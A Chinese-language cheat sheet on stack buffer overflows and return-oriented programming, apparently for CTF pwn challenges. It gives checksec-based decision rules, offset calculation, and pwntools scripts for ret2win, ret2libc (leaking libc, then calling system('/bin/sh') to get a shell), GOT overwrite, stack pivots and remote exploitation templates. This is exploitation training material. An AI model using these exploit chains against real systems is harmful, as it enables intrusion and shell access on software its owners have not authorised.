# 栈溢出 + ROP

## 标准流程

```
1. checksec
2. 找溢出点（gets/strcpy/sprintf/read 超长 buffer）
3. 算偏移（cyclic + crash）
4. 看防护决定利用方式：
   - 无 NX → shellcode
   - NX + 无 PIE → ret2text / ret2win / ret2libc
   - 全开 → 先信息泄露
```

## checksec 决策

| Canary | NX | PIE | RELRO | 思路 |
|---|---|---|---|---|
| ✗ | ✗ | ✗ | ✗ | 经典溢出 shellcode |
| ✗ | ✓ | ✗ | Partial | ROP / ret2libc |
| ✓ | ✓ | ✗ | Partial | 泄露 canary 后 ROP |
| ✓ | ✓ | ✓ | Full | 泄露 canary + PIE + libc 后 ROP |

## 偏移计算

```python
from pwn import *
cyclic(200)                # 生成
# 程序崩溃时看 rsp 内容
cyclic_find(0x6161616a)    # 反查偏移
```

或直接 `pattern.py create 200` / `pattern.py offset 0x6161616a`。

## ret2win

`main` 中调 `gets(buf)`，buf 偏移 0x40，有 `win` 函数：
```python
from pwn import *
elf = ELF('./bin')
p = process('./bin')
p.sendline(b'A'*0x48 + p64(elf.sym.win))
p.interactive()
```

注意 stack 16 字节对齐：x86_64 调用前 RSP 必须 % 16 == 0，不对齐时加一个 `ret` gadget。

## ret2libc

```python
from pwn import *
elf = ELF('./bin')
libc = ELF('./libc.so.6')
p = process('./bin')

# 步骤 1：泄露 libc 地址（用 puts(puts_got) 或 puts(printf_got)）
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')   # 回到 main 继续溢出
payload = b'A'*0x48 + rop.chain()
p.sendline(payload)

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = leak - libc.sym['puts']
log.success(f'libc @ {hex(libc_base)}')

# 步骤 2：拿 shell
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
ret = rop.find_gadget(['ret']).address
payload = b'A'*0x48 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendline(payload)
p.interactive()
```

## one_gadget 替代 system

```bash
one_gadget /libc.so.6
# 看输出几个候选地址，逐个试约束（rsp/rax 要满足）
```

```python
libc_base + 0x4527a   # 第 0 个 one_gadget
```

## SROP

`syscall; ret` gadget 配合伪造 sigreturn frame，绕过缺少 gadget 的情形。

## 常见 gadgets

```bash
ROPgadget --binary ./bin --only "pop|ret"
# 关键：
# pop rdi; ret      → 第 1 参数
# pop rsi; pop r15; ret → 第 2 参数 + 占位
# pop rdx; ret      → 第 3 参数（少见，可能要去 libc 找）
# syscall; ret      → 通用 syscall
```

```python
rop = ROP(elf)
print(rop.dump())   # 看 pwntools 自动构造
```

## stack pivot

栈被覆盖区域有限时，先跳到大数据区：
```
leave; ret               # mov rsp, rbp; pop rbp; ret
pop rsp; ret             # 直接控 rsp
xchg rax, rsp            # rax 可控时
```

## got 改写

RELRO Partial 时 GOT 可写：
```python
# read GOT[strlen] 改成 system
rop.call('read', [0, elf.got['strlen'], 8])
p.send(p64(libc_base + libc.sym.system))
rop.call('strlen', [binsh])    # 触发改写后的函数指针
```

## 远程攻防

```python
p = remote('target', 1337)
# 通常用 puts 泄露 → 接收 → 解析 → 二次 payload
# 远程 libc 不同时用 libc-database / pwninit / patchelf
```

## libc 版本指纹

```bash
# 已知一个 leak 用 libc-database 反查
./find puts 0x123456 printf 0x123abc
```
